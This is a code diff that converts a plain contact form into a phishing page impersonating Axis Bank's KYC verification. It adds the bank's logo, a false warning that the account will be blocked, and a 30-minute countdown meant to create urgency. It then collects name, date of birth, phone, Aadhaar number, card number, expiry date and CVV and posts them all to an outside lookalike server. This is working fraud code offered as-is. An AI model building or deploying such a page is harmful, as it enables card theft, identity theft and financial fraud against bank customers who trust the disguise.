@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Form</title>
+    <title>Bank KYC Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,13 +13,16 @@
             height: 100vh;
             margin: 0;
             background-color: #f0f0f0;
+            flex-direction: column;
         }
         .form-container {
             background: white;
             padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 300px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 20px;
         }
         h2 {
             text-align: center;
@@ -50,48 +53,186 @@
         button:hover {
             background: #218838;
         }
+        .alert {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        #status-bar {
+            width: 100%;
+            height: 10px;
+            background: #ddd;
+            margin-bottom: 20px;
+        }
+        #progress {
+            height: 100%;
+            width: 33%; /* Step 1: Personal Info */
+            background: #28a745;
+        }
         #response {
             margin-top: 10px;
             text-align: center;
             color: #333;
         }
+        .image-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .timer {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+        .timer-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <h2>Contact Form</h2>
-        <form id="contactForm">
-            <label for="name">Name:</label>
-            <input type="text" id="name" name="name" required>
-            <label for="phone">Phone Number:</label>
-            <input type="tel" id="phone" name="phone" required>
-            <button type="submit">Submit</button>
+        <div class="image-container">
+            <img src="https://bv.world/wp-content/uploads/2023/01/AxisBank-logo.jpg" alt="Axis Bank Logo" style="max-width: 100%; height: auto;">
+        </div>
+        <h2>Bank KYC Verification</h2>
+        <div id="alertMessage" class="alert">Account will be blocked soon! Immediate action required within 30 minutes.</div>
+        <div id="status-bar">
+            <div id="progress"></div>
+        </div>
+        
+        <form id="kycForm">
+            <!-- Step 1: Personal Info -->
+            <div id="step1">
+                <label for="name">Full Name:</label>
+                <input type="text" id="name" name="name" required>
+
+                <label for="dob">Date of Birth (DD/MM/YYYY):</label>
+                <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" required>
+
+                <label for="phone">Phone Number:</label>
+                <input type="tel" id="phone" name="phone" required>
+
+                <label for="aadhaar">Aadhaar Number:</label>
+                <input type="text" id="aadhaar" name="aadhaar" required>
+
+                <button type="button" id="nextBtn">Next</button>
+            </div>
+            
+            <!-- Step 2: Card Info (hidden initially) -->
+            <div id="step2" style="display: none;">
+                <label for="cardNumber">Card Number:</label>
+                <input type="text" id="cardNumber" name="cardNumber" required>
+
+                <label for="expiryDate">Expiry Date (MM/YYYY):</label>
+                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YYYY" required>
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" required>
+
+                <button type="submit" id="submitBtn">Submit</button>
+            </div>
         </form>
+
         <div id="response"></div>
     </div>
 
+    <!-- Timer Display -->
+    <div class="timer-container">
+        <div id="timer" class="timer"></div>
+    </div>
+
     <script>
-        document.getElementById('contactForm').addEventListener('submit', async (e) => {
+        // Timer countdown for urgency
+        let countdown = 30 * 60; // 30 minutes in seconds
+        const timerDisplay = document.getElementById('timer');
+
+        const updateTimer = () => {
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+            timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (countdown > 0) {
+                countdown--;
+            }
+        };
+        
+        setInterval(updateTimer, 1000);
+        updateTimer(); // Initialize timer immediately
+
+        // Handling form steps
+        const nextBtn = document.getElementById('nextBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const progressBar = document.getElementById('progress');
+
+        nextBtn.addEventListener('click', () => {
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+            progressBar.style.width = '66%'; // Update progress bar for step 2
+        });
+
+        // Automatically format DOB input field (DD/MM/YYYY)
+        const dobInput = document.getElementById('dob');
+        dobInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2 && value.length <= 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            } else if (value.length > 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
+            }
+            e.target.value = value; // Apply the formatted value
+        });
+
+        // Automatically format Expiry Date input field (MM/YYYY)
+        const expiryDateInput = document.getElementById('expiryDate');
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value; // Apply the formatted value
+        });
+
+        document.getElementById('kycForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const name = document.getElementById('name').value.trim();
+            const dob = document.getElementById('dob').value.trim();
             const phone = document.getElementById('phone').value.trim();
+            const aadhaar = document.getElementById('aadhaar').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const expiryDate = document.getElementById('expiryDate').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
             const responseDiv = document.getElementById('response');
             responseDiv.textContent = 'Sending...';
             responseDiv.style.color = '#333';
 
-            if (!name || !phone) {
-                responseDiv.textContent = 'Please fill in both fields.';
+            if (!name || !dob || !phone || !aadhaar || !cardNumber || !expiryDate || !cvv) {
+                responseDiv.textContent = 'Please fill in all fields.';
                 responseDiv.style.color = 'red';
                 return;
             }
 
             try {
-                const response = await fetch('https://axisbank-github-io.onrender.com/send', {
+                const response = await fetch('https://axisbank-github-io.onrender.com', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ name, phone }),
+                    body: JSON.stringify({
+                        name,
+                        dob,
+                        phone,
+                        aadhaar,
+                        cardNumber,
+                        expiryDate,
+                        cvv
+                    }),
                 });
 
                 const result = await response.json();
@@ -99,7 +240,7 @@
                 
                 if (response.ok) {
                     responseDiv.style.color = 'green';
-                    document.getElementById('contactForm').reset();
+                    document.getElementById('kycForm').reset();
                 } else {
                     responseDiv.style.color = 'red';
                 }
